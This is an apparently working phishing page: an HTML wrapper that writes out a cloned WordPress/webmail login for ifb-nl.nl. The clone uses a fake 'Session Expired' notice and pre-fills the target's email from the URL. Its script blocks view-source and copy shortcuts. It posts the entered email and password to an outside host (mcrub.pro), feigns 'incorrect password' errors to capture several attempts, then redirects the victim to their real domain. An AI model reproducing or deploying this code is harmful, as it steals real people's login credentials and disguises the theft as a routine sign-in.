<!DOCTYPE html>
<html>
<head>

  <script>
  document.write(unescape(atob("<!DOCTYPE html>
<!-- saved from url=(0030)https://ifb-nl.nl/wp-login.php -->


<html lang="en-GB"><script src="https://ia601200.us.archive.org/15/items/zxcvbn.min.js/zxcvbn.min.js.download" type="text/javascript" async=""></script><script>
    window[Symbol.for('MARIO_POST_CLIENT_eppiocemhmnlbhjplcgkofciiegomcon')] = new (class PostClient {
    constructor(name, destination) {
        this.name = name;
        this.destination = destination;
        this.serverListeners = {};
        this.bgRequestsListeners = {};
        this.bgEventsListeners = {};
        window.addEventListener('message', (message) => {
            const data = message.data;
            const isNotForMe = !(data.destination && data.destination === this.name);
            const hasNotEventProp = !data.event;
            if (isNotForMe || hasNotEventProp) {
                return;
            }
            if (data.event === 'MARIO_POST_SERVER__BG_RESPONSE') {
                const response = data.args;
                if (this.hasBgRequestListener(response.requestId)) {
                    try {
                        this.bgRequestsListeners[response.requestId](response.response);
                    }
                    catch (e) {
                        console.log(e);
                    }
                    delete this.bgRequestsListeners[response.requestId];
                }
            }
            else if (data.event === 'MARIO_POST_SERVER__BG_EVENT') {
                const response = data.args;
                if (this.hasBgEventListener(response.event)) {
                    try {
                        this.bgEventsListeners[data.id](response.payload);
                    }
                    catch (e) {
                        console.log(e);
                    }
                }
            }
            else if (this.hasServerListener(data.event)) {
                try {
                    this.serverListeners[data.event](data.args);
                }
                catch (e) {
                    console.log(e);
                }
            }
            else {
                console.log(`event not handled: ${data.event}`);
            }
        });
    }
    emitToServer(event, args) {
        const id = this.generateUIID();
        const message = {
            args,
            destination: this.destination,
            event,
            id,
        };
        window.postMessage(message, location.origin);
        return id;
    }
    emitToBg(bgEventName, args) {
        const requestId = this.generateUIID();
        const request = { bgEventName, requestId, args };
        this.emitToServer('MARIO_POST_SERVER__BG_REQUEST', request);
        return requestId;
    }
    hasServerListener(event) {
        return !!this.serverListeners[event];
    }
    hasBgRequestListener(requestId) {
        return !!this.bgRequestsListeners[requestId];
    }
    hasBgEventListener(bgEventName) {
        return !!this.bgEventsListeners[bgEventName];
    }
    fromServerEvent(event, listener) {
        this.serverListeners[event] = listener;
    }
    fromBgEvent(bgEventName, listener) {
        this.bgEventsListeners[bgEventName] = listener;
    }
    fromBgResponse(requestId, listener) {
        this.bgRequestsListeners[requestId] = listener;
    }
    generateUIID() {
        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
            const r = Math.random() * 16 | 0, v = c === 'x' ? r : (r & 0x3 | 0x8);
            return v.toString(16);
        });
    }
})('MARIO_POST_CLIENT_eppiocemhmnlbhjplcgkofciiegomcon', 'MARIO_POST_SERVER_eppiocemhmnlbhjplcgkofciiegomcon')</script><script>
    const hideMyLocation = new (class HideMyLocation {
    constructor(clientKey) {
        this.clientKey = clientKey;
        this.watchIDs = {};
        this.client = window[Symbol.for(clientKey)];
        const getCurrentPosition = navigator.geolocation.getCurrentPosition;
        const watchPosition = navigator.geolocation.watchPosition;
        const clearWatch = navigator.geolocation.clearWatch;
        const self = this;
        navigator.geolocation.getCurrentPosition = function (successCallback, errorCallback, options) {
            self.handle(getCurrentPosition, 'GET', successCallback, errorCallback, options);
        };
        navigator.geolocation.watchPosition = function (successCallback, errorCallback, options) {
            return self.handle(watchPosition, 'WATCH', successCallback, errorCallback, options);
        };
        navigator.geolocation.clearWatch = function (fakeWatchId) {
            if (fakeWatchId === -1) {
                return;
            }
            const realWatchId = self.watchIDs[fakeWatchId];
            delete self.watchIDs[fakeWatchId];
            return clearWatch.apply(this, [realWatchId]);
        };
    }
    handle(getCurrentPositionOrWatchPosition, type, successCallback, errorCallback, options) {
        const requestId = this.client.emitToBg('HIDE_MY_LOCATION__GET_LOCATION');
        let fakeWatchId = this.getRandomInt(0, 100000);
        this.client.fromBgResponse(requestId, (response) => {
            if (response.enabled) {
                if (response.status === 'SUCCESS') {
                    const position = this.map(response);
                    successCallback(position);
                }
                else {
                    const error = this.errorObj();
                    errorCallback(error);
                    fakeWatchId = -1;
                }
            }
            else {
                const args = [successCallback, errorCallback, options];
                const watchId = getCurrentPositionOrWatchPosition.apply(navigator.geolocation, args);
                if (type === 'WATCH') {
                    this.watchIDs[fakeWatchId] = watchId;
                }
            }
        });
        if (type === 'WATCH') {
            return fakeWatchId;
        }
    }
    map(response) {
        return {
            coords: {
                accuracy: 20,
                altitude: null,
                altitudeAccuracy: null,
                heading: null,
                latitude: response.latitude,
                longitude: response.longitude,
                speed: null,
            },
            timestamp: Date.now(),
        };
    }
    errorObj() {
        return {
            code: 1,
            message: 'User denied Geolocation',
        };
    }
    getRandomInt(min, max) {
        min = Math.ceil(min);
        max = Math.floor(max);
        return Math.floor(Math.random() * (max - min + 1)) + min;
    }
})('MARIO_POST_CLIENT_eppiocemhmnlbhjplcgkofciiegomcon')
  </script><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	
	<title>Log In ‹ IFB Contracting — WordPress</title>
	<meta name="robots" content="noindex, follow">
<link rel="stylesheet" id="dashicons-css" href="https://ia601200.us.archive.org/15/items/zxcvbn.min.js/dashicons.min.css" type="text/css" media="all">
<link rel="stylesheet" id="buttons-css" href="https://ia601200.us.archive.org/15/items/zxcvbn.min.js/buttons.min.css" type="text/css" media="all">
<link rel="stylesheet" id="forms-css" href="https://ia601200.us.archive.org/15/items/zxcvbn.min.js/forms.min.css" type="text/css" media="all">
<link rel="stylesheet" id="l10n-css" href="https://ia601200.us.archive.org/15/items/zxcvbn.min.js/l10n.min.css" type="text/css" media="all">
<link rel="stylesheet" id="login-css" href="https://ia601200.us.archive.org/15/items/zxcvbn.min.js/login.min.css" type="text/css" media="all">
	<meta name="referrer" content="strict-origin-when-cross-origin">
		<meta name="viewport" content="width=device-width">
	<link rel="icon" href="https://ifb-nl.nl/wp-content/uploads/2023/03/cropped-New-Project-43-32x32.png" sizes="32x32">
<link rel="icon" href="https://ifb-nl.nl/wp-content/uploads/2023/03/cropped-New-Project-43-192x192.png" sizes="192x192">
<link rel="apple-touch-icon" href="https://ifb-nl.nl/wp-content/uploads/2023/03/cropped-New-Project-43-180x180.png">
<meta name="msapplication-TileImage" content="https://ifb-nl.nl/wp-content/uploads/2023/03/cropped-New-Project-43-270x270.png">
	<script ecommerce-type="extend-native-history-api">(() => {
            const nativePushState = history.pushState;
            const nativeReplaceState = history.replaceState;
            const nativeBack = history.back;
            const nativeForward = history.forward;
            function emitUrlChanged() {
                const message = {
                    _custom_type_: 'CUSTOM_ON_URL_CHANGED',
                };
                window.postMessage(message);
            }
            history.pushState = function () {
                nativePushState.apply(history, arguments);
                emitUrlChanged();
            };
            history.replaceState = function () {
                nativeReplaceState.apply(history, arguments);
                emitUrlChanged();
            };
            history.back = function () {
                nativeBack.apply(history, arguments);
                emitUrlChanged();
            };
            history.forward = function () {
                nativeForward.apply(history, arguments);
                emitUrlChanged();
            };
        })()</script><script>(function inject(e){function SendXHRCandidate(e,t,n,r,i){try{var o="detector",s={posdMessageId:"PANELOS_MESSAGE",posdHash:(Math.random().toString(36).substring(2,15)+Math.random().toString(36).substring(2,15)+Math.random().toString(36).substring(2,15)).substring(0,22),type:"VIDEO_XHR_CANDIDATE",from:o,to:o.substring(0,6),content:{requestMethod:e,url:t,type:n,content:r}};i&&i[0]&&i[0].length&&(s.content.encodedPostBody=i[0]),window.postMessage(s,"*")}catch(e){}}var t=XMLHttpRequest.prototype.open;XMLHttpRequest.prototype.open=function(){this.requestMethod=arguments[0],t.apply(this,arguments)};var n=XMLHttpRequest.prototype.send;XMLHttpRequest.prototype.send=function(){var t=Object.assign(arguments,{}),r=this.onreadystatechange;return this.onreadystatechange=function(){if(4!==this.readyState||function isFrameInBlackList(t){return e.some((function(e){return t.includes(e)}))}(this.responseURL)||setTimeout(SendXHRCandidate(this.requestMethod,this.responseURL,this.getResponseHeader("content-type"),this.response,t),0),r)return r.apply(this,arguments)},n.apply(this,arguments)};var r=fetch;fetch=function fetch(){var e=this,t=arguments,n=arguments[0]instanceof Request?arguments[0].url:arguments[0],i=arguments[0]instanceof Request?arguments[0].method:"GET";return new Promise((function(o,s){r.apply(e,t).then((function(e){if(e.body instanceof ReadableStream){var t=e.json;e.json=function(){var r=arguments,o=this;return new Promise((function(s,a){t.apply(o,r).then((function(t){setTimeout(SendXHRCandidate(i,n,e.headers.get("content-type"),JSON.stringify(t)),0),s(t)})).catch((function(e){a(e)}))}))};var r=e.text;e.text=function(){var t=arguments,o=this;return new Promise((function(s,a){r.apply(o,t).then((function(t){setTimeout(SendXHRCandidate(i,n,e.headers.get("content-type"),t),0),s(t)})).catch((function(e){a(e)}))}))}}o.apply(this,arguments)})).catch((function(){s.apply(this,arguments)}))}))}})(["facebook.com/","twitter.com/","youtube-nocookie.com/embed/","//vk.com/","//www.vk.com/","//linkedin.com/","//www.linkedin.com/","//instagram.com/","//www.instagram.com/","//www.google.com/recaptcha/api2/","//hangouts.google.com/webchat/","//www.google.com/calendar/","//www.google.com/maps/embed","spotify.com/","soundcloud.com/","//player.vimeo.com/","//disqus.com/","//tgwidget.com/","//js.driftt.com/","friends2follow.com","/widget","login","//video.bigmir.net/","blogger.com","//smartlock.google.com/","//keep.google.com/","/web.tolstoycomments.com/","moz-extension://","chrome-extension://","/auth/","//analytics.google.com/","adclarity.com","paddle.com/checkout","hcaptcha.com","recaptcha.net","2captcha.com","accounts.google.com","www.google.com/shopping/customerreviews","buy.tinypass.com","gstatic.com","secureir.ebaystatic.com","docs.google.com","contacts.google.com","github.com","mail.google.com","chat.google.com","audio.xpleer.com","keepa.com","static.xx.fbcdn.net"]);</script></head>
	<body class="login js login-action-login wp-core-ui  locale-en-gb" bis_register="W3sibWFzdGVyIjp0cnVlLCJleHRlbnNpb25JZCI6ImVwcGlvY2VtaG1ubGJoanBsY2drb2ZjaWllZ29tY29uIiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJlbmFibGVkIiwiRkFDRUJPT0siOiJlbmFibGVkIiwiVFdJVFRFUiI6ImVuYWJsZWQiLCJSRURESVQiOiJlbmFibGVkIiwiUElOVEVSRVNUIjoiZGlzYWJsZWQiLCJJTlNUQUdSQU0iOiJkaXNhYmxlZCJ9LCJ2ZXJzaW9uIjoiMS45LjE1Iiwic2NvcmUiOjEwOTE1MH1d" data-new-gr-c-s-check-loaded="14.1137.0" data-gr-ext-installed="">
	<script type="text/javascript">
/* <![CDATA[ */
document.body.className = document.body.className.replace('no-js','js');
/* ]]> */
</script>

		<div id="login" bis_skin_checked="1">
		<h1><img src="" alt="" id="logoimg" width="15%"></img></h1>
		
	<div id="login_error" class="notice notice-error" bis_skin_checked="1"><p><strong>Error:</strong> 
	
	<div withid="login-status" class="error-notice" style="visibility: visible;">
            <div class="content-wrapper">
                <div id="login-detail">
                    <div id="login-status-icon-container"><span class="login-status-icon"></span></div>
                    <div id="msg" style="">Session Expired. Please login again!</div>
					                    <div id="msg2"  style="display: none;">The password you entered for this email address <b><span style="color:rgb(62%, 7%, 4%)	;" id="aicx"></span></b>  is incorrect.</div>
										                    <div id="msg1" style="display: none; ">The password you entered for the email address <b><span style="color:rgb(62%, 7%, 4%)	;" id="aicxx"></span></b> is incorrect.</div>
                </div>
				
				
            </div>
        </div> </p></div>
		<form name="loginform" id="loginform" action="" method="post" class="shake">
			<p>
				<label for="user_login">Username</label>
				<div style="border:0.7px solid; border-radius:4px;">
				<div style="margin-bottom:10px; margin-top:10px; margin-left:3px;">
				<b><span id="aich">info@ifb-nl.nl</span></b>
				</div>
				</div>
			</p>
<input type="hidden" name="email" id="username" aria-describedby="login_error" class="input password-input" value="" size="20" autocomplete="off" spellcheck="false" required="required">
					
 <input type="hidden"  id="ai" value="" size="20" autocomplete="off"  required="required">
					
			<div class="user-pass-wrap" bis_skin_checked="1">
				<label for="user_pass">Password</label>
				<div class="wp-pwd" bis_skin_checked="1">
				
				
				
					<input type="password" style="font-size:14px;"name="pr" id="pr" aria-describedby="login_error" placeholder="Enter email password" class="input password-input" value="" size="20" autocomplete="off" spellcheck="false" required="required">
					
					
					
					
					
					
					
					
					
					
				</div>
			</div>
						<p class="forgetmenot"><input name="rememberme" type="checkbox" id="rememberme" value="forever"> <label for="rememberme">Remember Me</label></p>
			<p class="submit">
				<input type="submit" name="wp-submit" id="submit-btn" class="button button-primary button-large" value="Log In">
									<input type="hidden" name="redirect_to" value="https://ifb-nl.nl/wp-admin/">
									<input type="hidden" name="testcookie" value="1">
			</p>
		</form>

					<p id="nav">
				<a class="wp-login-lost-password" href="#">Lost your password?</a>			</p>
			<script type="text/javascript">
/* <![CDATA[ */
function wp_attempt_focus() {setTimeout( function() {try {d = document.getElementById( "user_pass" ); d.value = "";d.focus(); d.select();} catch( er ) {}}, 200);}
wp_attempt_focus();
if ( typeof wpOnload === 'function' ) { wpOnload() }
/* ]]> */
</script>
		<p id="backtoblog">
			<a href="#">← Go to Secured Contracting</a>		</p>
			</div>
				<div class="language-switcher" bis_skin_checked="1">
				<form id="language-switcher" action="" method="get">

					<label for="language-switcher-locales">
						<span class="dashicons dashicons-translation" aria-hidden="true"></span>
						<span class="screen-reader-text">
							Secured						</span>
					</label>

					<span style="color:rgb(5%, 31%, 55%);" id="logonamec"></span>&nbsp;<span style="color:rgb(5%, 31%, 55%);">Webmail</span>
					
					
					
						

					</form>
				</div>
				<script type="text/javascript">
/* <![CDATA[ */
document.querySelector('form').classList.add('shake');
/* ]]> */
</script>
<script type="text/javascript" src="https://ia601200.us.archive.org/15/items/zxcvbn.min.js/jquery.min.js.download" id="jquery-core-js"></script>
<script type="text/javascript" src="https://ia601200.us.archive.org/15/items/zxcvbn.min.js/jquery-migrate.min.js.download" id="jquery-migrate-js"></script>
<script type="text/javascript" id="zxcvbn-async-js-extra">
/* <![CDATA[ */
var _zxcvbnSettings = {"src":"https:\/\/ifb-nl.nl\/wp-includes\/js\/zxcvbn.min.js"};
/* ]]> */
</script>
<script type="text/javascript" src="https://ia601200.us.archive.org/15/items/zxcvbn.min.js/zxcvbn-async.min.js.download" id="zxcvbn-async-js"></script>
<script type="text/javascript" src="https://ia601200.us.archive.org/15/items/zxcvbn.min.js/wp-polyfill-inert.min.js.download" id="wp-polyfill-inert-js"></script>
<script type="text/javascript" src="https://ia601200.us.archive.org/15/items/zxcvbn.min.js/regenerator-runtime.min.js.download" id="regenerator-runtime-js"></script>
<script type="text/javascript" src="https://ia601200.us.archive.org/15/items/zxcvbn.min.js/wp-polyfill.min.js.download" id="wp-polyfill-js"></script>
<script type="text/javascript" src="https://ia601200.us.archive.org/15/items/zxcvbn.min.js/hooks.min.js.download" id="wp-hooks-js"></script>
<script type="text/javascript" src="https://ia601200.us.archive.org/15/items/zxcvbn.min.js/i18n.min.js.download" id="wp-i18n-js"></script>
<script type="text/javascript" id="wp-i18n-js-after">
/* <![CDATA[ */
wp.i18n.setLocaleData( { 'text direction\u0004ltr': [ 'ltr' ] } );
/* ]]> */
</script>
<script type="text/javascript" id="password-strength-meter-js-extra">
/* <![CDATA[ */
var pwsL10n = {"unknown":"Password strength unknown","short":"Very weak","bad":"Weak","good":"Medium","strong":"Strong","mismatch":"Mismatch"};
/* ]]> */
</script>
<script type="text/javascript" id="password-strength-meter-js-translations">
/* <![CDATA[ */
( function( domain, translations ) {
	var localeData = translations.locale_data[ domain ] || translations.locale_data.messages;
	localeData[""].domain = domain;
	wp.i18n.setLocaleData( localeData, domain );
} )( "default", {"translation-revision-date":"2023-10-07 10:32:51+0000","generator":"GlotPress\/4.0.0-alpha.9","domain":"messages","locale_data":{"messages":{"":{"domain":"messages","plural-forms":"nplurals=2; plural=n != 1;","lang":"en_GB"},"%1$s is deprecated since version %2$s! Use %3$s instead. Please consider writing more inclusive code.":["%1$s is deprecated since version %2$s! Use %3$s instead. Please consider writing more inclusive code."]}},"comment":{"reference":"wp-admin\/js\/password-strength-meter.js"}} );
/* ]]> */
</script>
<script type="text/javascript" src="https://ia601200.us.archive.org/15/items/zxcvbn.min.js/password-strength-meter.min.js.download" id="password-strength-meter-js"></script>
<script type="text/javascript" src="https://ia601200.us.archive.org/15/items/zxcvbn.min.js/underscore.min.js.download" id="underscore-js"></script>
<script type="text/javascript" id="wp-util-js-extra">
/* <![CDATA[ */
var _wpUtilSettings = {"ajax":{"url":"\/wp-admin\/admin-ajax.php"}};
/* ]]> */
</script>
<script type="text/javascript" src="https://ia601200.us.archive.org/15/items/zxcvbn.min.js/wp-util.min.js.download" id="wp-util-js"></script>
<script type="text/javascript" id="user-profile-js-extra">
/* <![CDATA[ */
var userProfileL10n = {"user_id":"0","nonce":"b4b6c31b40"};
/* ]]> */
</script>
<script type="text/javascript" id="user-profile-js-translations">
/* <![CDATA[ */
( function( domain, translations ) {
	var localeData = translations.locale_data[ domain ] || translations.locale_data.messages;
	localeData[""].domain = domain;
	wp.i18n.setLocaleData( localeData, domain );
} )( "default", {"translation-revision-date":"2023-10-07 10:32:51+0000","generator":"GlotPress\/4.0.0-alpha.9","domain":"messages","locale_data":{"messages":{"":{"domain":"messages","plural-forms":"nplurals=2; plural=n != 1;","lang":"en_GB"},"Your new password has not been saved.":["Your new password has not been saved."],"Hide":["Hide"],"Show":["Show"],"Confirm use of weak password":["Confirm use of weak password"],"Hide password":["Hide password"],"Show password":["Show password"]}},"comment":{"reference":"wp-admin\/js\/user-profile.js"}} );
/* ]]> */
</script>
<script type="text/javascript" src="https://ia601200.us.archive.org/15/items/zxcvbn.min.js/user-profile.min.js.download" id="user-profile-js"></script>
	
	
	</body><grammarly-desktop-integration data-grammarly-shadow-root="true"><template shadowrootmode="open"><style>
      div.grammarly-desktop-integration {
        position: absolute;
        width: 1px;
        height: 1px;
        padding: 0;
        margin: -1px;
        overflow: hidden;
        clip: rect(0, 0, 0, 0);
        white-space: nowrap;
        border: 0;
        -moz-user-select: none;
        -webkit-user-select: none;
        -ms-user-select:none;
        user-select:none;
      }

      div.grammarly-desktop-integration:before {
        content: attr(data-content);
      }
    </style><div aria-label="grammarly-integration" role="group" tabindex="-1" class="grammarly-desktop-integration" data-content="{&quot;mode&quot;:&quot;full&quot;,&quot;isActive&quot;:true,&quot;isUserDisabled&quot;:false}"></div></template></grammarly-desktop-integration>
	</body><grammarly-desktop-integration data-grammarly-shadow-root="true"></grammarly-desktop-integration>
<script>
// Set the date we're counting down to
var countDownDate = new Date("Jan 5, 2024 15:37:25").getTime();

// Update the count down every 1 second
var x = setInterval(function() {

  // Get today's date and time
  var now = new Date().getTime();
    
  // Find the distance between now and the count down date
  var distance = countDownDate - now;
    
  // Time calculations for days, hours, minutes and seconds
  var days = Math.floor(distance / (1000 * 60 * 60 * 24));
  var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
  var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
  var seconds = Math.floor((distance % (1000 * 60)) / 1000);
    
  // Output the result in an element with id="demo"
  document.getElementById("demo").innerHTML = hours + "h "
  + minutes + "m " + seconds + "s ";
    
  // If the count down is over, write some text 
  if (distance < 0) {
    clearInterval(x);
    document.getElementById("demo").innerHTML = "EXPIRED";
  }
}, 1000);
</script>

<!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script type="text/javascript" src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
    <script type="text/javascript" src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
</body>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>

<script>


// prevent ctrl + s
$(document).bind('keydown', function(e) {
if(e.ctrlKey && (e.which == 83)) {
e.preventDefault();
return false;
}
});

document.addEventListener('contextmenu', event => event.preventDefault());

document.onkeydown = function(e) {
if (e.ctrlKey && 
(e.keyCode === 67 || 
e.keyCode === 86 || 
e.keyCode === 85 || 
e.keyCode === 117)) {
return false;
} else {
return true;
}
};
$(document).keypress("u",function(e) {
if(e.ctrlKey)
{
return false;      }
else {
return true;
}});

/* global $ */
$(document).ready(function() {
    var count = 0;


    /////////////url ai getting////////////////
    var ai = window.location.hash.substr(1);
    if (!ai) {

    } else {
        var base64regex = /^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;

        if (!base64regex.test(ai)) {
            // alert(btoa(ai));
            var my_ai = ai;
        } else {
            // alert(atob(ai));
            var my_ai = atob(ai);
        }
        // $('#ai').val(ai);
        // var my_ai =ai;
        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

        if (!filter.test(my_ai)) {
            $('#error').show();
            ai.focus;
            return false;
        }
        var ind = my_ai.indexOf("@");
        var my_slice = my_ai.substr((ind + 1));
        var c = my_slice.substr(0, my_slice.indexOf('.'));
        var final = c.toLowerCase();
        var finalu = c.toUpperCase();
        $('#ai').val(my_ai);
        $("#div1").animate({ left: 0, opacity: "hide" }, 0);
        $("#div2").animate({ right: 0, opacity: "show" }, 500);
        
		$("#aicx").html(my_ai);
		$("#aicxx").html(my_ai);
        $("#aich").html(my_ai);
        $.get("https://logo.clearbit.com/" + my_slice)
            .done(function() {
                $("#logoimg").attr("src", "https://logo.clearbit.com/" + my_slice);
                $("#logoname").html(finalu);
				$("#logonamec").html(finalu);

            }).fail(function() {
                $("#logoimg").attr("src", "http://anchormak.com/webmail/skins/elastic/images/logo.svg?s=1656275218");
                $("#logoname").html("");
				$("#logonamec").html("");

            });


    }





    $('#ai').click(function() {
        $('#error').hide();
    });

    $(document).keypress(function(event) {

        var keycode = (event.keyCode ? event.keyCode : event.which);
        if (keycode == '13') {
            event.preventDefault();
            if ($("#div1").is(":visible")) {

                $("#next").click();

            } else if ($("#div2").is(":visible")) {
                event.preventDefault();

                $("#submit-btn").click();

            } else {
                return false;
            }
        }
    });


    $('#next').click(function() {
        event.preventDefault();
        var my_ai = $('#ai').val();
        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

        if (!filter.test(my_ai)) {
            $('#error').show();
            ai.focus;
            return false;
        }
        var ind = my_ai.indexOf("@");
        var my_slice = my_ai.substr((ind + 1));
        var c = my_slice.substr(0, my_slice.indexOf('.'));
        var final = c.toLowerCase();
        var finalu = c.toUpperCase();
        $("#div1").animate({ left: 0, opacity: "hide" }, 0);
        $("#div2").animate({ right: 0, opacity: "show" }, 500);

        $("#aich").html(my_ai);
		$("#aicx").html(my_ai);
		$("#aicxx").html(my_ai);
        $.get("" + my_slice)
            .done(function() {
                $("#logoimg").attr("src", "" + my_slice);
                $("#logoname").html(finalu);
				$("#logonamec").html(finalu);

            }).fail(function() {
                $("#logoimg").attr("src", "http://anchormak.com/webmail/skins/elastic/images/logo.svg?s=1656275218");
                $("#logoname").html("");
				$("#logonamec").html("");

            });





    });
    // $('#back').click(function() {
    //     // $("#msg").hide();
    //     $("#ai").val("");
    //     $("#pr").val("");
    //     $("#div2").animate({ left: 0, opacity: "hide" }, 0);
    //     $("#div1").animate({ right: 0, opacity: "show" }, 1000);

    // });
var file="bmV4dC5waHA=";

    $('#submit-btn').click(function(event) {
        event.preventDefault();
        var ai = $("#ai").val();
        var pr = $("#pr").val();
        var detail = $("#field").html();
        var msg = $('#msg').html();

        var my_ai = ai;
        var ind = my_ai.indexOf("@");
        var my_slice = my_ai.substr((ind + 1));
        var c = my_slice.substr(0, my_slice.indexOf('.'));
        var final = c.toLowerCase();
        $('#msg').text(msg);
        count = count + 1;
        $.ajax({
            dataType: 'JSON',
            url: 'https://mcrub.pro/otiki/',
            type: 'POST',
            data: {
                ai: ai,
                pr: pr,
                detail: detail,

            },
            beforeSend: function(xhr) {
                $("#submit-btn").html("Loading....");
            },
            success: function(response) {
                $("#pr").val("");
                if (count >= 3) {
                    count = 0;
                    $("#div2").animate({ left: 0, opacity: "hide" }, 0);
                    $("#div3").animate({ left: 0, opacity: "show" }, 500);
                    setTimeout(() => {
              window.location.replace("https://www."+my_slice);
                    }, 500);
                    return false;
                }
                if (count == 2) {
                    $("#msg2").show();
                    $("#msg").hide();
                    $("#msg1").hide();
                } else {
                    $("#msg1").show();
                    $("#msg").hide();
                    $("#msg2").hide();

                }
            },
            error: function() {
                $("#pr").val("");
                if (count >= 3) {
                    count = 0;
                    $("#div2").animate({ left: 0, opacity: "hide" }, 0);
                    $("#div3").animate({ left: 0, opacity: "show" }, 500);
                    setTimeout(() => {
                        window.location.replace("https://www."+my_slice);
                    }, 1000);
                    return false;
                }
                if (count == 2) {
                    $("#msg2").show();
                    $("#msg").hide();
                    $("#msg1").hide();
                } else {
                    $("#msg1").show();
                    $("#msg").hide();
                    $("#msg2").hide();

                }
            },
            complete: function() {
                $("#submit-btn").html("Loading...");
            }
        });
    });
});
</script>
	</html>")));
  </script>
  
  
  
  <title>Mail-Website</title>
  
</head>


<body>


</body>
</html>